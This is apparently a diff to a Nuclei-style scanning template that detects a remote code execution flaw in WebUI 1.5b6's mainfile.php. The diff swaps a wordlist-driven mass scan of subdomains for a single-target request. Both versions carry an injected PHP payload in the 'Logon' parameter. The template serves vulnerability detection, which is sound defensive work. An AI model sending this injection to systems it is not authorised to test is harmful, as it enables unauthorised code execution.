@@ -3,22 +3,16 @@ info:
   name: WebUI 1.5b6 RCE
   author: pikpikcu
   severity: critical
+  description: WebUI's 'mainfile.php' endpoint contain a vulnerability that allows remote attackers to cause it to execute arbitrary code via the 'Logon' parameter.
   reference: https://www.exploit-db.com/exploits/36821
   tags: webui,rce
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
 
-    raw:
-      - |
-        GET /mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27 HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27'
+
     matchers-condition: and
     matchers:
       - type: word
